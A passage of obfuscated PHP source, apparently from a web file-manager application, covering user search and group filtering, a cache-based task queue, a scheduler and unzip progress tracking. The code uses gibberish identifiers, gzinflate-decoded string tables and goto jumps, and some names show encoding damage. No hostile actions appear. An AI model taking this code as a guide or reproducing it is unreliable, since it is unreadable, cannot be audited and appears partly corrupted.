array($å·ø€•Ÿ[457] => array()); foreach ($û¬ö®»² as $†Èë©¬¦) { if (!trim($†Èë©¬¦)) { continue; } $ĞÒŞ°Ìƒ[$å·ø€•Ÿ[2057]] = $†Èë©¬¦; $ÒÀ³ÃÀë = $this->listSearchNow($ĞÒŞ°Ìƒ); $øÍëúÔƒ[$å·ø€•Ÿ[457]] = array_merge($øÍëúÔƒ[$å·ø€•Ÿ[457]], $ÒÀ³ÃÀë[$å·ø€•Ÿ[457]]); } $øÍëúÔƒ[$å·ø€•Ÿ[457]] = array_unique_by_key($øÍëúÔƒ[$å·ø€•Ÿ[457]], $å·ø€•Ÿ[1759]); $øÍëúÔƒ[$å·ø€•Ÿ[454]] = array($å·ø€•Ÿ[455] => count($øÍëúÔƒ[$å·ø€•Ÿ[457]]), $å·ø€•Ÿ[451] => 20, $å·ø€•Ÿ[440] => 1, $å·ø€•Ÿ[456] => 1); return $øÍëúÔƒ; } public function listSearchNow($“Ü¶¡µ™) { $ÓĞ¦¡øá =& $_SERVER[ü¢ÙÊñÛ]; $åòüå¢ó = trim($“Ü¶¡µ™[$ÓĞ¦¡øá[2057]]); $Æ«¶ì®ê = isset($“Ü¶¡µ™[$ÓĞ¦¡øá[2058]]) ? $“Ü¶¡µ™[$ÓĞ¦¡øá[2058]] : !1; $åòüå¢ó = str_replace($ÓĞ¦¡øá[2059], $ÓĞ¦¡øá[2060], trim($åòüå¢ó)); $¯âŠ•½¢ = array($ÓĞ¦¡øá[42] => array($ÓĞ¦¡øá[470], "\x25{$åòüå¢ó}\x25"), $ÓĞ¦¡øá[392] => array($ÓĞ¦¡øá[470], "{$åòüå¢ó}\45"), $ÓĞ¦¡øá[2254] => array($ÓĞ¦¡øá[470], "{$åòüå¢ó}\x25"), $ÓĞ¦¡øá[1066] => $ÓĞ¦¡øá[2061]); if (Input::check($åòüå¢ó, $ÓĞ¦¡øá[398])) { $¯âŠ•½¢[$ÓĞ¦¡øá[1759]] = array($ÓĞ¦¡øá[470], "{$åòüå¢ó}\45"); $¯âŠ•½¢[$ÓĞ¦¡øá[2471]] = array($ÓĞ¦¡øá[470], "{$åòüå¢ó}\x25"); } if (!$åòüå¢ó) { $¯âŠ•½¢ = array(); } if (isset($“Ü¶¡µ™[$ÓĞ¦¡øá[815]])) { $¯âŠ•½¢[$ÓĞ¦¡øá[815]] = $“Ü¶¡µ™[$ÓĞ¦¡øá[815]]; } $¯âŠ•½¢ = $this->parseWhereLike($¯âŠ•½¢); $³ô©µ®÷ = $this->_makeOrder()->where($¯âŠ•½¢)->selectPage(20); if (!$³ô©µ®÷ || count($³ô©µ®÷[$ÓĞ¦¡øá[457]]) < 5 && Input::check($åòüå¢ó, $ÓĞ¦¡øá[405])) { $¥œÓí•Á = $this->_searchFromMeta($ÓĞ¦¡øá[548], $åòüå¢ó, 10); $õéë‰Ûâ = $this->_searchFromMeta($ÓĞ¦¡øá[549], $åòüå¢ó, 10); $¼ù‹âıİ = array_merge($¥œÓí•Á, $õéë‰Ûâ, $³ô©µ®÷[$ÓĞ¦¡øá[457]]); $³ô©µ®÷[$ÓĞ¦¡øá[457]] = array_unique_by_key($¼ù‹âıİ, $ÓĞ¦¡øá[1759]); $³ô©µ®÷[$ÓĞ¦¡øá[454]][$ÓĞ¦¡øá[455]] = count($³ô©µ®÷[$ÓĞ¦¡øá[457]]); $³ô©µ®÷[$ÓĞ¦¡øá[454]][$ÓĞ¦¡øá[456]] = ceil($³ô©µ®÷[$ÓĞ¦¡øá[454]][$ÓĞ¦¡øá[455]] / $³ô©µ®÷[$ÓĞ¦¡øá[454]][$ÓĞ¦¡øá[451]]); } $this->_listDataApply($³ô©µ®÷[$ÓĞ¦¡øá[457]]); $this->_filterByGroup($³ô©µ®÷, $Æ«¶ì®ê); return $³ô©µ®÷; } private function _filterByGroup(&$¥²¤ß„ş, $Ÿ¹«ªæú) { $ôøÂĞü‡ =& $_SERVER[ü¢ÙÊñÛ]; if (!$Ÿ¹«ªæú) { return $¥²¤ß„ş; } foreach ($¥²¤ß„ş[$ôøÂĞü‡[457]] as $š¡®–ã => &$ÂŞå×•İ) { $îœ­’¨ = array_to_keyvalue($ÂŞå×•İ[$ôøÂĞü‡[2151]], $ôøÂĞü‡[22], $ôøÂĞü‡[1959]); if (!in_array($Ÿ¹«ªæú, $îœ­’¨)) { unset($¥²¤ß„ş[$ôøÂĞü‡[457]][$š¡®–ã]); } } unset($ÂŞå×•İ); $¥²¤ß„ş[$ôøÂĞü‡[457]] = array_values($¥²¤ß„ş[$ôøÂĞü‡[457]]); $¥²¤ß„ş[$ôøÂĞü‡[454]] = array($ôøÂĞü‡[2219] => count($¥²¤ß„ş[$ôøÂĞü‡[457]]), $ôøÂĞü‡[2217] => $¥²¤ß„ş[$ôøÂĞü‡[454]][$ôøÂĞü‡[451]], $ôøÂĞü‡[2216] => 1, $ôøÂĞü‡[2218] => 1); } private function _searchFromMeta($Ì«ù‰ª£, $Ø„ªØŞÆ, $ôªú÷»¾) { $¶Ù´«¡º =& $_SERVER[ü¢ÙÊñÛ]; $Ø„ªØŞÆ = strtolower($Ø„ªØŞÆ); $¡”Ğë­ê = array($¶Ù´«¡º[108] => $Ì«ù‰ª£, $¶Ù´«¡º[462] => array($¶Ù´«¡º[470], "\x25{$Ø„ªØŞÆ}\x25")); $¡”Ğë­ê = $this->parseWhereLike($¡”Ğë­ê); $…œ»ËŸÑ = Model($¶Ù´«¡º[2490])->where($¡”Ğë­ê)->limit($ôªú÷»¾)->select(); if (!$…œ»ËŸÑ) { return array(); } $…œ»ËŸÑ = array_to_keyvalue($…œ»ËŸÑ, $¶Ù´«¡º[22], $¶Ù´«¡º[1759]); $¢…ï÷Š = $this->where(array($¶Ù´«¡º[1750] => array($¶Ù´«¡º[17], $…œ»ËŸÑ)))->select(); if (!$¢…ï÷Š) { return array(); } return $¢…ï÷Š; } private function _listDataApplyItem($é¶£æÚÁ) { $øñÜáç© = array($é¶£æÚÁ); $this->_listDataApply($øñÜáç©); return $øñÜáç©[0]; } private function _listDataApply(&$Ô¦óÄûë) { $ğÏ¼¸ö =& $_SERVER[ü¢ÙÊñÛ]; if (!$Ô¦óÄûë) { return; } array_remove_key($Ô¦óÄûë, $ğÏ¼¸ö[955]); $ƒº ˆÒí = array_to_keyvalue($Ô¦óÄûë, $ğÏ¼¸ö[22], $ğÏ¼¸ö[1759]); $this->_listAppendGroup($Ô¦óÄûë, $ƒº ˆÒí); $this->_listAppendMeta($Ô¦óÄûë, $ƒº ˆÒí); $this->_listAppendSourceRoot($Ô¦óÄûë, $ƒº ˆÒí); } private function _listAppendSourceRoot(&$éô‘¨®, $Ö¿¢Ö¢) { $Ø˜Ş˜€¯ =& $_SERVER[ü¢ÙÊñÛ]; $„¦‡Îğë = Model($Ø˜Ş˜€¯[890])->listSourceRoot(SourceModel::TYPE_USER, $Ö¿¢Ö¢); $„¦‡Îğë = array_to_keyvalue($„¦‡Îğë, $Ø˜Ş˜€¯[580]); $„¦‡Îğë = array_remove_key($„¦‡Îğë, $Ø˜Ş˜€¯[580]); foreach ($éô‘¨® as &$ä²œì†—) { $ä²œì†—[$Ø˜Ş˜€¯[101]] = $„¦‡Îğë[$ä²œì†—[$Ø˜Ş˜€¯[1759]]] ? $„¦‡Îğë[$ä²œì†—[$Ø˜Ş˜€¯[1759]]] : array(); } unset($ä²œì†—); } private function _listAppendGroup(&$ìôÄÆ„œ, $æ«”Ÿ†”) { $òƒÙÉ¼ =& $_SERVER[ü¢ÙÊñÛ]; $¾¨øºö = array($òƒÙÉ¼[1759] => array($òƒÙÉ¼[17], $æ«”Ÿ†”)); $ì×›æÁÉ = Model($òƒÙÉ¼[2053])->where($¾¨øºö)->select(); $Š·ÈÇ–é = array_to_keyvalue($ì×›æÁÉ, $òƒÙÉ¼[22], $òƒÙÉ¼[1959]); $Š·ÈÇ–é = array_remove_value(array_unique($Š·ÈÇ–é), $òƒÙÉ¼[241]); if (!$Š·ÈÇ–é || !$ì×›æÁÉ) { return; } $¾¨øºö = array($òƒÙÉ¼[1959] => array($òƒÙÉ¼[17], $Š·ÈÇ–é)); $Ç–“²Ø = Model($òƒÙÉ¼[2149])->field($òƒÙÉ¼[2491])->where($¾¨øºö)->select(); $Ç–“²Ø = array_to_keyvalue($Ç–“²Ø, $òƒÙÉ¼[1959]); $ì×›æÁÉ = array_to_keyvalue_group($ì×›æÁÉ, $òƒÙÉ¼[1759]); foreach ($ì×›æÁÉ as &$‘…Øƒšå) { $ô®ûìå´ = array(); foreach ($‘…Øƒšå as $´ºĞåÖÙ) { if (!$´ºĞåÖÙ[$òƒÙÉ¼[2067]]) { continue; } $”ºøçÓı = Model($òƒÙÉ¼[582])->listData($´ºĞåÖÙ[$òƒÙÉ¼[2067]]); $ô®ûìå´[] = array($òƒÙÉ¼[1959] => $´ºĞåÖÙ[$òƒÙÉ¼[1959]], $òƒÙÉ¼[2492] => $Ç–“²Ø[$´ºĞåÖÙ[$òƒÙÉ¼[1959]]][$òƒÙÉ¼[42]], $òƒÙÉ¼[595] => $Ç–“²Ø[$´ºĞåÖÙ[$òƒÙÉ¼[1959]]][$òƒÙÉ¼[595]], $òƒÙÉ¼[498] => $”ºøçÓı); } $‘…Øƒšå = $ô®ûìå´; } unset($‘…Øƒšå); foreach ($ìôÄÆ„œ as &$·£Äˆ”é) { $·£Äˆ”é[$òƒÙÉ¼[2151]] = array(); if (isset($ì×›æÁÉ[$·£Äˆ”é[$òƒÙÉ¼[1759]]])) { $·£Äˆ”é[$òƒÙÉ¼[2151]] = $ì×›æÁÉ[$·£Äˆ”é[$òƒÙÉ¼[1759]]]; } } unset($·£Äˆ”é); } public function userAppendGroup($¿ œá’Ó) { $­®óœô¶ =& $_SERVER[ü¢ÙÊñÛ]; if (!$¿ œá’Ó) { return array(); } $this->_listAppendGroup($¿ œá’Ó, array_to_keyvalue($¿ œá’Ó, $­®óœô¶[22], $­®óœô¶[1759])); return $¿ œá’Ó; } private function _listAppendMeta(&$Ô÷Å’­¹, $€âÅ¡) { $â«şîşÛ =& $_SERVER[ü¢ÙÊñÛ]; $ëúÄš±— = UserJobModel::JOB_KEY; $¨¯àî… = array($â«şîşÛ[2472]); $ŒçºÁ›¼ = array($â«şîşÛ[1759] => array($â«şîşÛ[17], $€âÅ¡)); $¢šë Ë‹ = Model($â«şîşÛ[2470])->where($ŒçºÁ›¼)->select(); $¢šë Ë‹ = array_to_keyvalue_group($¢šë Ë‹, $â«şîşÛ[1759]); foreach ($¢šë Ë‹ as &$ıä‘³¯µ) { $Œ»òò = array(); foreach ($ıä‘³¯µ as $©Şï›ß) { if (!in_array($©Şï›ß[$â«şîşÛ[108]], $¨¯àî…)) { $Œ»òò[$©Şï›ß[$â«şîşÛ[108]]] = $©Şï›ß[$â«şîşÛ[462]]; } } $ıä‘³¯µ = $Œ»òò; } unset($ıä‘³¯µ); $ö¹˜ã¡Ş = Model($â«şîşÛ[2493]); foreach ($Ô÷Å’­¹ as &$µ á™¬–) { $×ÈüÒ¨´ = array(); if (isset($¢šë Ë‹[$µ á™¬–[$â«şîşÛ[1759]]])) { $×ÈüÒ¨´ = $¢šë Ë‹[$µ á™¬–[$â«şîşÛ[1759]]]; } $µ á™¬–[$â«şîşÛ[2494]] = array(); if (isset($×ÈüÒ¨´[$ëúÄš±—])) { $µ á™¬–[$â«şîşÛ[2494]] = $ö¹˜ã¡Ş->getUserJobInfo($×ÈüÒ¨´[$ëúÄš±—]); } } unset($µ á™¬–); } protected function groupUserAll($ÛÜÇ¿­) { $˜«èÉşé =& $_SERVER[ü¢ÙÊñÛ]; if (!$ÛÜÇ¿­) { return !1; } $ÀÅíîº = Model($˜«èÉşé[2053])->field($˜«èÉşé[1759])->where(array($˜«èÉşé[1959] => array($˜«èÉşé[17], $ÛÜÇ¿­)))->select(); $ÀÅíîº = array_to_keyvalue($ÀÅíîº, $˜«èÉşé[22], $˜«èÉşé[1759]); return array_unique($ÀÅíîº); } public function userSearch($ÔÏ‡ , $Éõ†¶Ú³ = "\x2a") { return Model($_SERVER[ü¢ÙÊñÛ][608])->where($ÔÏ‡ )->field($Éõ†¶Ú³)->find(); } } goto A³ƒ‹ØÂóæ; C‡ŠŒ‹ƒâ: define($_SERVER[ü¢ÙÊñÛ][0], $_SERVER[ü¢ÙÊñÛ][1]); $_SERVER[³ñ±ª˜‘] = explode($_SERVER[ü¢ÙÊñÛ][2], gzinflate(substr($_SERVER[ü¢ÙÊñÛ][3], 10, -8))); function binCheckEq($®ğ‘ÀöÙ, $¢’Ô·ó) { return $®ğ‘ÀöÙ == $¢’Ô·ó; } goto E×¸‚¥¿íÄ; E¢Â·ÏÚ: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\x51\165\x65\165\x65\x4c\145\x6e\x67\164\150"; const QUEUE_DATA = "\x74\x61\x73\153\121\x75\145\165\145\x44\141\164\141"; const QUEUE_TIME = "\x74\141\x73\153\x51\x75\x65\x75\x65\114\141\163\164\122\x75\x6e"; const QUEUE_THREAD = "\164\x61\163\x6b\x51\165\145\x75\145\124\x68\x72\x65\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÍŸãªœ, $óô»±¯Ø = array(), $’Ù«°Âº = '', $ÓºàÌ¾£ = '') { $Ö·‰…Íğ =& $_SERVER[ü¢ÙÊñÛ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ÓºàÌ¾£ && array_find_by_field(self::$listData, $Ö·‰…Íğ[108], $ÓºàÌ¾£)) { return !0; } if ($ÓºàÌ¾£ && array_find_by_field(self::$listDataAdd, $Ö·‰…Íğ[108], $ÓºàÌ¾£)) { return !0; } self::$listDataAdd[] = array($Ö·‰…Íğ[353] => $ÍŸãªœ, $Ö·‰…Íğ[1858] => $óô»±¯Ø, $Ö·‰…Íğ[537] => $’Ù«°Âº, $Ö·‰…Íğ[108] => $ÓºàÌ¾£); return !0; } public static function addSubmit() { $Õ™¾Ûİ• =& $_SERVER[ü¢ÙÊñÛ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Õ™¾Ûİ•[1859] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Õ™¾Ûİ•[22], $Õ™¾Ûİ•[537])), $Õ™¾Ûİ•[208]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ëûæ•îå, $Ç¶Üù’º = array(), $‘©ÙŒõÁ = '', $ø©‡à…° = '') { $­«ŒØ¹¹ =& $_SERVER[ü¢ÙÊñÛ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $„Ò’µà° = self::getAll(); if ($ø©‡à…° && array_find_by_field($„Ò’µà°, $­«ŒØ¹¹[108], $ø©‡à…°)) { return !0; } $„Ò’µà°[] = array($­«ŒØ¹¹[353] => $ëûæ•îå, $­«ŒØ¹¹[1858] => $Ç¶Üù’º, $­«ŒØ¹¹[537] => $‘©ÙŒõÁ, $­«ŒØ¹¹[108] => $ø©‡à…°); self::setAll($„Ò’µà°); write_log($­«ŒØ¹¹[1859] . $‘©ÙŒõÁ, $­«ŒØ¹¹[208]); return !0; } public static function run() { $ãŸãºı¹ =& $_SERVER[ü¢ÙÊñÛ]; $ØÔó„éŠ = self::getAll(); $¡ÓÂÓ£› = array_shift($ØÔó„éŠ); if (!$¡ÓÂÓ£›) { return !1; } self::setAll($ØÔó„éŠ); $ßË²™Ï° = timeFloat(); $îÌ³òÔ× = $ãŸãºı¹[22]; try { $îÌ³òÔ× = Hook::apply($¡ÓÂÓ£›[$ãŸãºı¹[353]], $¡ÓÂÓ£›[$ãŸãºı¹[1858]]); } catch (Exception $ºÓàéû“) { write_log($ºÓàéû“, $ãŸãºı¹[1253]); } $İÀ˜Íªè = number_format(timeFloat() - $ßË²™Ï°, 3) . $ãŸãºı¹[1775]; if ($îÌ³òÔ× && is_string($îÌ³òÔ×)) { $İÀ˜Íªè = $İÀ˜Íªè . $ãŸãºı¹[1860] . $îÌ³òÔ×; } write_log($ãŸãºı¹[1861] . $¡ÓÂÓ£›[$ãŸãºı¹[537]] . $ãŸãºı¹[1862] . $İÀ˜Íªè, $ãŸãºı¹[208]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Î®Äˆ‘– =& $_SERVER[ü¢ÙÊñÛ]; $Óàê÷ƒÎ = self::threadCount() + 1; if ($Óàê÷ƒÎ > 3 || !self::count()) { return; } write_log($Î®Äˆ‘–[1863] . $Óàê÷ƒÎ, $Î®Äˆ‘–[208]); Cache::set(self::QUEUE_THREAD, $Óàê÷ƒÎ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Î®Äˆ‘–[1864], $Î®Äˆ‘–[208]); } public static function getKey($‚ÃºÊªú, $’äòĞû = "\151\156\x74") { $Ó’ìµÖŞ =& $_SERVER[ü¢ÙÊñÛ]; Cache::removeMemory($‚ÃºÊªú); $ŠÒöùÂ¦ = Cache::get($‚ÃºÊªú); if ($’äòĞû == $Ó’ìµÖŞ[375]) { return $ŠÒöùÂ¦ ? intval($ŠÒöùÂ¦) : 0; } if ($’äòĞû == $Ó’ìµÖŞ[1865]) { return is_array($ŠÒöùÂ¦) ? $ŠÒöùÂ¦ : array(); } return $ŠÒöùÂ¦; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ü¢ÙÊñÛ][1865]); } public static function setAll($¥‹©Ó®™) { $ÃêÑò = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¥‹©Ó®™), $ÃêÑò); Cache::set(self::QUEUE_DATA, $¥‹©Ó®™, $ÃêÑò); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Š´»ø‰œ, $åÎ‘ÔÃÔ = 5.0) { if (!$Š´»ø‰œ) { return; } $Çö†Ä— = Cache::get($Š´»ø‰œ); if (!$Çö†Ä— || timeFloat() - floatVal($Çö†Ä—) >= $åÎ‘ÔÃÔ) { Cache::set($Š´»ø‰œ, timeFloat(), $åÎ‘ÔÃÔ * 10); return !0; } return !1; } public static function timeLimitCall($§ğó¡Àş, $ÎÉòß»¹, $‚†Î­Ë, $ğ½·âÙØ = 5.0) { $£±óÇäô =& $_SERVER[ü¢ÙÊñÛ]; if (!$§ğó¡Àş || !$ÎÉòß»¹) { return; } self::$asyncAdd = !0; $¬ä«î“ = $£±óÇäô[1866]; $Ó”‘à³ = Cache::get($¬ä«î“, !0); $û¿æ§ÏÆ = array($£±óÇäô[1867] => timeFloat(), $£±óÇäô[1868] => timeFloat(), $£±óÇäô[353] => $ÎÉòß»¹, $£±óÇäô[1858] => $‚†Î­Ë, $£±óÇäô[217] => $ğ½·âÙØ); if (is_array($Ó”‘à³[$§ğó¡Àş])) { $û¿æ§ÏÆ[$£±óÇäô[1868]] = $Ó”‘à³[$§ğó¡Àş][$£±óÇäô[1868]]; } if (is_array($Ó”‘à³[$§ğó¡Àş])) { if (timeFloat() - $Ó”‘à³[$§ğó¡Àş][$£±óÇäô[1867]] < $û¿æ§ÏÆ[$£±óÇäô[217]] * 0.3) { return; } $û¿æ§ÏÆ[$£±óÇäô[1868]] = $Ó”‘à³[$§ğó¡Àş][$£±óÇäô[1868]]; } $Ó”‘à³[$§ğó¡Àş] = $û¿æ§ÏÆ; Cache::set($¬ä«î“, $Ó”‘à³, 60); Cache::removeMemory($¬ä«î“); write_log($£±óÇäô[1869] . $§ğó¡Àş . $£±óÇäô[85] . $ÎÉòß»¹, $£±óÇäô[208]); } public static function timeLimitCallLoop() { $«âä¯ÚÂ =& $_SERVER[ü¢ÙÊñÛ]; $›á¿ÆÂº = array($«âä¯ÚÂ[1870]); $î¨ûƒï = in_array(strtolower(ACTION), $›á¿ÆÂº); if (!$î¨ûƒï && !self::$asyncAdd) { return; } $–„½ËéÈ = $«âä¯ÚÂ[1866]; $Õüæºˆ÷ = Cache::get($–„½ËéÈ, !0); if (!$Õüæºˆ÷ || count($Õüæºˆ÷) <= 0) { return; } $Â€´µÄŞ = !1; $ø‚¿»òË = timeFloat(); $“äÂçş = array(); foreach ($Õüæºˆ÷ as $‘ªßËÙè => $ˆß×‡Çâ) { if ($ø‚¿»òË - $ˆß×‡Çâ[$«âä¯ÚÂ[1868]] > $ˆß×‡Çâ[$«âä¯ÚÂ[217]]) { $Â€´µÄŞ = !0; try { Hook::apply($ˆß×‡Çâ[$«âä¯ÚÂ[353]], $ˆß×‡Çâ[$«âä¯ÚÂ[1858]]); write_log($«âä¯ÚÂ[1871] . $‘ªßËÙè . $«âä¯ÚÂ[85] . $ˆß×‡Çâ[$«âä¯ÚÂ[353]] . $«âä¯ÚÂ[1872] . ACTION, $«âä¯ÚÂ[208]); } catch (Exception $×³‘ü) { } continue; } $“äÂçş[$‘ªßËÙè] = $ˆß×‡Çâ; } if (!$Â€´µÄŞ) { return; } if (!$“äÂçş) { return Cache::remove($–„½ËéÈ); } Cache::set($–„½ËéÈ, $“äÂçş, 60); Cache::removeMemory($–„½ËéÈ); } public static function finished($íáŸÎà, $ã„Ø†â) { $´–¹©á =& $_SERVER[ü¢ÙÊñÛ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($´–¹©á[353] => $íáŸÎà, $´–¹©á[1858] => $ã„Ø†â); } private static function finishedRun() { $ëáìÑÓ¹ =& $_SERVER[ü¢ÙÊñÛ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ÛÜİòæ) { try { Hook::apply($ÛÜİòæ[$ëáìÑÓ¹[353]], $ÛÜİòæ[$ëáìÑÓ¹[1858]]); } catch (Exception $ÇçùƒÅÑ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ÓÚúƒÓĞ =& $_SERVER[ü¢ÙÊñÛ]; parent::startAfter(); Hook::bind($ÓÚúƒÓĞ[1873], array($this, $ÓÚúƒÓĞ[1874])); Hook::bind($ÓÚúƒÓĞ[1267], array($this, $ÓÚúƒÓĞ[1875])); Hook::bind($ÓÚúƒÓĞ[1876], array($this, $ÓÚúƒÓĞ[1877])); $ÄØ”©„­ =& $this->task; $ÄØ”©„­[$ÓÚúƒÓĞ[1878]] = $ÓÚúƒÓĞ[1268]; if (!$ÄØ”©„­[$ÓÚúƒÓĞ[1647]]) { $ÄØ”©„­[$ÓÚúƒÓĞ[1647]] = LNG($ÓÚúƒÓĞ[1879]); } } protected function endAfter() { $è²Š†Ãà =& $_SERVER[ü¢ÙÊñÛ]; parent::endAfter(); Hook::unbind($è²Š†Ãà[1873], array($this, $è²Š†Ãà[1874])); Hook::unbind($è²Š†Ãà[1267], array($this, $è²Š†Ãà[1875])); Hook::unbind($è²Š†Ãà[1876], array($this, $è²Š†Ãà[1877])); } public function updateAfter() { $í›¿£¼Ş =& $_SERVER[ü¢ÙÊñÛ]; $¶ÒÒ¼‰Œ =& $this->task; if (!$¶ÒÒ¼‰Œ[$í›¿£¼Ş[1129]] || !$¶ÒÒ¼‰Œ[$í›¿£¼Ş[828]]) { if ($¶ÒÒ¼‰Œ[$í›¿£¼Ş[1878]] != $í›¿£¼Ş[400]) { return; } } if ($¶ÒÒ¼‰Œ[$í›¿£¼Ş[1878]] == $í›¿£¼Ş[1268]) { $©É¥Ããã = 0; if ($¶ÒÒ¼‰Œ[$í›¿£¼Ş[1813]]) { $©É¥Ããã = $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1814]] / $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1813]]; } $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1761]] = $©É¥Ããã * 0.3; } else { if ($¶ÒÒ¼‰Œ[$í›¿£¼Ş[1878]] == $í›¿£¼Ş[400]) { $©É¥Ããã = $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1760]] / $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1129]]; $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1761]] = 0.3 + $©É¥Ããã * 0.4; } else { if ($¶ÒÒ¼‰Œ[$í›¿£¼Ş[1878]] == $í›¿£¼Ş[121]) { $Îƒ¯’İ® = 0; if ($¶ÒÒ¼‰Œ[$í›¿£¼Ş[1815]] == $í›¿£¼Ş[121]) { $Îƒ¯’İ® = $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1814]]; } $©É¥Ããã = ($¶ÒÒ¼‰Œ[$í›¿£¼Ş[1818]] + $Îƒ¯’İ®) / $¶ÒÒ¼‰Œ[$í›¿£¼Ş[828]]; $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1761]] = 0.3 + 0.4 + $©É¥Ããã * 0.3; } } } if ($¶ÒÒ¼‰Œ[$í›¿£¼Ş[1761]] > 0) { $·’•úˆ = timeFloat() - $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1763]] - $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1766]]; $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1767]] = $·’•úˆ * (1 - $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1761]]) / $¶ÒÒ¼‰Œ[$í›¿£¼Ş[1761]]; } } public function addFile($å«€Ôêñ) { $ğššä£— =& $_SERVER[ü¢ÙÊñÛ]; $Ÿ½ÀÊˆ§ =& $this->task; $Ô¥Ãúë² = IO::info($å«€Ôêñ); $Ÿ½ÀÊˆ§[$ğššä£—[1811]] = $Ô¥Ãúë²[$ğššä£—[42]]; $Ÿ½ÀÊˆ§[$ğššä£—[1813]] = $Ô¥Ãúë²[$ğššä£—[90]]; $Ÿ½ÀÊˆ§[$ğššä£—[1814]] = 0; $Ÿ½ÀÊˆ§[$ğššä£—[1131]] = $ğššä£—[1834]; $Ÿ½ÀÊˆ§[$ğššä£—[1815]] = $ğššä£—[1268]; $Ÿ½ÀÊˆ§[$ğššä£—[828]] = $Ô¥Ãúë²[$ğššä£—[90]]; $Ÿ½ÀÊˆ§[$ğššä£—[1129]] = 1; $¡·²“± = 0; $Ÿ½ÀÊˆ§[$ğššä£—[1822]] = array($ğššä£—[1823] => $¡·²“± + 1, $ğššä£—[505] => $Ô¥Ãúë²[$ğššä£—[42]], $ğššä£—[98] => $Ô¥Ãúë²[$ğššä£—[98]], $ğššä£—[593] => $Ô¥Ãúë²[$ğššä£—[593]] ? $Ô¥Ãúë²[$ğššä£—[593]] : $Ô¥Ãúë²[$ğššä£—[98]]); $this->update(); } public function zipEvent($©§ô„ø’, $òø•’âÓ, $¹Ù¶š, $ÖÀ‡Å¤”) { $­ªÙ =& $_SERVER[ü¢ÙÊñÛ]; $·ñœËà“ =& $this->task; $·ñœËà“[$­ªÙ[1811]] = get_path_this($òø•’âÓ); $·ñœËà“[$­ªÙ[1813]] = $ÖÀ‡Å¤”; $·ñœËà“[$­ªÙ[1814]] = $¹Ù¶š; $·ñœËà“[$­ªÙ[1131]] = $©§ô„ø’ == $­ªÙ[1880] ? $­ªÙ[1881] : $­ªÙ[1882]; $·ñœËà“[$­ªÙ[1815]] = $­ªÙ[22]; $·ñœËà“[$­ªÙ[828]] = $ÖÀ‡Å¤”; $·ñœËà“[$­ªÙ[1878]] = $­ªÙ[400]; $this->update(); } public function unzipAfter($¾¤öæÖœ) { $®ªö§¤½ =& $_SERVER[ü¢ÙÊñÛ]; $åÃôÕòÍ =& $this->task; $åÃôÕòÍ[$®ªö§¤½[1878]] = $®ªö§¤½[121]; $Øîú È = IO::infoWithChildren($¾¤öæÖœ); $Üº€ë€Ì = 0; $åÃôÕòÍ[$®ªö§¤½[1822]] = array($®ªö§¤½[1823] => $Üº€ë€Ì + 1, $®ªö§¤½[505] => $Øîú È[$®ªö§¤½[42]], $®ªö§¤½[98] => $Øîú È[$®ªö§¤½[98]], $®ªö§¤½[593] => $Øîú È[$®ªö§¤½[593]] ? $Øîú È[$®ªö§¤½[593]] : $Øîú È[$®ªö§¤½[98]]); if ($Øîú È[$®ªö§¤½[43]] == $®ªö§¤½[243]) { $åÃôÕòÍ[$®ªö§¤½[1129]] = 1; } else { $åÃôÕòÍ[$®ªö§¤½[1129]] = $Øîú È[$®ªö§¤½[93]][$®ªö§¤½[91]]; } $åÃôÕòÍ[$®ªö§¤½[1131]] = $®ªö§¤½[22]; $åÃôÕòÍ[$®ªö§¤½[1815]] = 0; $åÃôÕòÍ[$®ªö§¤½[1760]] = 0; $åÃôÕòÍ[$®ªö§¤½[1813]] = 0; $åÃôÕòÍ[$®ªö§¤½[1814]] = 0; $åÃôÕòÍ[$®ªö§¤½[1811]] = $®ªö§¤½[22]; $åÃôÕòÍ[$®ªö§¤½[1818]] = 0; $åÃôÕòÍ[$®ªö§¤½[828]] = $Øîú È[$®ªö§¤½[90]]; $this->update(); self::log($®ªö§¤½[1883] . json_encode(array($åÃôÕòÍ, $Øîú È))); } public function nameParse($ç“Ì‚Ã”) { $ÉÁæ‰òî =& $_SERVER[ü¢ÙÊñÛ]; $ûìåŸ¼µ =& $this->task; if ($ûìåŸ¼µ[$ÉÁæ‰òî[1878]] == $ÉÁæ‰òî[1268]) { $ûìåŸ¼µ[$ÉÁæ‰òî[1878]] = 